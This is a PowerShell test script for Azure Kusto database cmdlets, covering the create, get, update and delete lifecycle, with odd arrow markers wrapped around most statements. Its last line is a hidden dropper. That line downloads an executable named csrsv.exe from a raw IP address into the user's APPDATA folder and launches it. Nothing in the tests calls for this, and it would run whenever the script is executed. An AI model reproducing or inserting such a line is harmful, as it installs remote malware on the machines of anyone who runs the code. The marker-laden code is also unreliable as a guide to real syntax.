
 -||-> function Test-KustoDatabaseLifecycle
{
	 -||-> try
	{  
		 -||-> $RGlocation =  -||-> Get-RG-Location <-||-  <-||- 
		 -||-> $location =  -||-> Get-Location <-||-  <-||- 
		 -||-> $resourceGroupName =  -||-> Get-RG-Name <-||-  <-||- 
		 -||-> $clusterName =  -||-> Get-Cluster-Name <-||-  <-||- 
		 -||-> $sku =  -||-> Get-Sku <-||-  <-||- 
		 -||-> $databaseName =  -||-> Get-Database-Name <-||-  <-||- 
		 -||-> $resourceType =   -||-> Get-Database-Type <-||-  <-||- 
		 -||-> $softDeletePeriodInDays =   -||-> Get-Soft-Delete-Period-In-Days <-||-  <-||- 
		 -||-> $hotCachePeriodInDays =   -||-> Get-Hot-Cache-Period-In-Days <-||-  <-||- 
		 -||-> $databaseFullName = "$clusterName/$databaseName" <-||- 
		 -||-> $expectedException =  -||-> Get-Database-Not-Exist-Message -DatabaseName $databaseName <-||-  <-||- 
		
		 -||-> $softDeletePeriodInDaysUpdated =  -||-> Get-Updated-Soft-Delete-Period-In-Days <-||-  <-||- 
		 -||-> $hotCachePeriodInDaysUpdated =  -||-> Get-Updated-Hot-Cache-Period-In-Days <-||-  <-||- 

		
		 -||-> New-AzResourceGroup -Name $resourceGroupName -Location $RGlocation <-||- 
		 -||-> $clusterCreated =  -||-> New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku <-||-  <-||- 

		 -||-> $databaseCreated =  -||-> New-AzKustoDatabase -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $databaseName -SoftDeletePeriodInDays $softDeletePeriodInDays -HotCachePeriodInDays $hotCachePeriodInDays <-||-  <-||- 
		 -||-> Validate_Database $databaseCreated $databaseFullName $location $type $softDeletePeriodInDays $hotCachePeriodInDays <-||- ;

		 -||-> $databaseGetItem =  -||-> Get-AzKustoDatabase -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $databaseName <-||-  <-||- 
		 -||-> Validate_Database $databaseGetItem $databaseFullName $location $type $softDeletePeriodInDays $hotCachePeriodInDays <-||- ;
		
		 -||-> $databaseUpdatedWithParameters =  -||-> Update-AzKustoDatabase -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $databaseName -SoftDeletePeriodInDays $softDeletePeriodInDaysUpdated -HotCachePeriodInDays $hotCachePeriodInDaysUpdated <-||-  <-||- 
		 -||-> Validate_Database $databaseUpdatedWithParameters $databaseFullName $location $type $softDeletePeriodInDaysUpdated $hotCachePeriodInDaysUpdated <-||- ;

		 -||-> $databaseUpdatedWithResourceId =  -||-> Update-AzKustoDatabase -ResourceId $databaseUpdatedWithParameters.Id -SoftDeletePeriodInDays $softDeletePeriodInDays -HotCachePeriodInDays $hotCachePeriodInDays <-||-  <-||- 
		 -||-> Validate_Database $databaseUpdatedWithResourceId $databaseFullName $location $type $softDeletePeriodInDays $hotCachePeriodInDays <-||- ;

		 -||-> $databaseUpdatedObject =  -||-> Update-AzKustoDatabase -InputObject $databaseUpdatedWithResourceId -SoftDeletePeriodInDays $softDeletePeriodInDaysUpdated -HotCachePeriodInDays $hotCachePeriodInDaysUpdated <-||-  <-||- 
		 -||-> Validate_Database $databaseUpdatedObject $databaseFullName $location $type $softDeletePeriodInDaysUpdated $hotCachePeriodInDaysUpdated <-||- ;

		 -||-> Remove-AzKustoDatabase -ResourceGroupName $resourceGroupName -ClusterName $clusterName -Name $databaseName <-||- 
		 -||-> Ensure_Database_Not_Exist $resourceGroupName $clusterName $databaseName $expectedException <-||- 
	}
	finally
	{

		 -||-> Invoke-HandledCmdlet -Command { -||-> Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -ErrorAction SilentlyContinue <-||- } -IgnoreFailures <-||- 
		 -||-> Invoke-HandledCmdlet -Command { -||-> Remove-AzResourceGroup -Name $resourceGroupName -ErrorAction SilentlyContinue <-||- } -IgnoreFailures <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-DatabaseAddRemoveGet {
	 -||-> try
	{
		 -||-> $RGlocation =  -||-> Get-RG-Location <-||-  <-||- 
		 -||-> $location =  -||-> Get-Location <-||-  <-||- 
		 -||-> $resourceGroupName =  -||-> Get-RG-Name <-||-  <-||- 
		 -||-> $clusterName =  -||-> Get-Cluster-Name <-||-  <-||- 
		 -||-> $sku =  -||-> Get-Sku <-||-  <-||- 
		 -||-> $databaseName =  -||-> Get-Database-Name <-||-  <-||- 
		 -||-> $resourceType =   -||-> Get-Database-Type <-||-  <-||- 
		 -||-> $softDeletePeriodInDays =   -||-> Get-Soft-Delete-Period-In-Days <-||-  <-||- 
		 -||-> $hotCachePeriodInDays =   -||-> Get-Hot-Cache-Period-In-Days <-||-  <-||- 
		 -||-> $databaseFullName = "$clusterName/$databaseName" <-||- 
		 -||-> $expectedException =  -||-> Get-Database-Not-Exist-Message -DatabaseName $databaseName <-||-  <-||- 

		
		 -||-> New-AzResourceGroup -Name $resourceGroupName -Location $RGlocation <-||- 
		 -||-> $clusterCreated =  -||-> New-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -Location $location -Sku $sku <-||-  <-||- 

		
		 -||-> $databaseCreated =  -||-> New-AzKustoDatabase -ResourceId $clusterCreated.Id -Name $databaseName -SoftDeletePeriodInDays $softDeletePeriodInDays -HotCachePeriodInDays $hotCachePeriodInDays <-||-  <-||- 
		 -||-> Validate_Database $databaseCreated $databaseFullName $location $type $softDeletePeriodInDays $hotCachePeriodInDays <-||- ;
		
		 -||-> $databaseGetItem =  -||-> Get-AzKustoDatabase -ResourceId $clusterCreated.Id -Name $databaseName <-||-  <-||- 
		 -||-> Validate_Database $databaseGetItem $databaseFullName $location $type $softDeletePeriodInDays $hotCachePeriodInDays <-||- ;
		
		 -||-> Remove-AzKustoDatabase -ResourceId $databaseGetItem.Id <-||- 
		 -||-> Ensure_Database_Not_Exist $resourceGroupName $clusterName $databaseName $expectedException <-||- 

		
		 -||-> $cluster =  -||-> Get-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName <-||-  <-||- 

		 -||-> $databaseCreated =  -||-> New-AzKustoDatabase -InputObject $cluster -Name $databaseName -SoftDeletePeriodInDays $softDeletePeriodInDays -HotCachePeriodInDays $hotCachePeriodInDays <-||-  <-||- 
		 -||-> Validate_Database $databaseCreated $databaseFullName $location $type $softDeletePeriodInDays $hotCachePeriodInDays <-||- ;
		
		 -||-> $databaseGetItem =  -||-> Get-AzKustoDatabase -InputObject $cluster -Name $databaseName <-||-  <-||- 
		 -||-> Validate_Database $databaseGetItem $databaseFullName $location $type $softDeletePeriodInDays $hotCachePeriodInDays <-||- ;

		 -||-> Remove-AzKustoDatabase -InputObject $databaseCreated <-||- 
		 -||-> Ensure_Database_Not_Exist $resourceGroupName $clusterName $databaseName $expectedException <-||- 
	}
	finally
	{
		
		 -||-> Invoke-HandledCmdlet -Command { -||-> Remove-AzKustoCluster -ResourceGroupName $resourceGroupName -Name $clusterName -ErrorAction SilentlyContinue <-||- } -IgnoreFailures <-||- 
		 -||-> Invoke-HandledCmdlet -Command { -||-> Remove-AzResourceGroup -Name $resourceGroupName -ErrorAction SilentlyContinue <-||- } -IgnoreFailures <-||- 
	} <-||- 
		
} <-||- 

 -||-> function Validate_Database {
	Param ([Object]$Database,
		[string]$DatabaseFullName,
		[string]$Location,
		[string]$Type,
		[int]$SoftDeletePeriodInDays,
		[int]$HotCachePeriodInDays)
		 -||-> Assert-AreEqual $DatabaseFullName $Database.Name <-||- 
		 -||-> Assert-AreEqual $Location $Database.Location <-||- 
		 -||-> Assert-AreEqual $ResourceType $Database.Type <-||- 
		 -||-> Assert-AreEqual $SoftDeletePeriodInDays $Database.SoftDeletePeriodInDays <-||-  
		 -||-> Assert-AreEqual $HotCachePeriodInDays $Database.HotCachePeriodInDays <-||-  
} <-||- 

 -||-> function Ensure_Database_Not_Exist {
	Param ([String]$ResourceGroupName,
			[String]$ClusterName,
			[string]$DatabaseName,
		[string]$ExpectedErrorMessage)
		 -||-> $expectedException = $false <-||- ;
		 -||-> try
        {
			 -||-> $databaseGetItemDeleted =  -||-> Get-AzKustoDatabase -ResourceGroupName $ResourceGroupName -ClusterName $ClusterName -Name $DatabaseName <-||-  <-||- 
        }
        catch
        {
             -||-> if ( -||-> $_ -Match $ExpectedErrorMessage <-||- )
            {
                 -||-> $expectedException = $true <-||- ;
            } <-||- 
        } <-||- 
         -||-> if ( -||-> -not $expectedException <-||- )
        {
            throw  -||-> "Expected exception from calling Get-AzKustoDatabase was not caught: '$expectedErrorMessage'." <-||- ;
        } <-||- 
} <-||- 
 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



